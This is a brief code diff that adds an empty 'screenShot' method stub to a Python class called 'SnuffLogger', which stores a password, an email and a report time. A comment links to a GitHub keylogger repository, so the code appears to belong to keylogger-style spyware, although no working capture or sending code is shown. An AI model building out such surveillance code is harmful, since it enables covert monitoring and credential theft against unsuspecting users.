@@ -67,3 +67,8 @@ class SnuffLogger:
         self.password = password
         self.email = email
         self.ReportTime = ReportTime
+    
+    def screenShot(self):
+
+
+#https://github.com/aydinnyunus/Keylogger
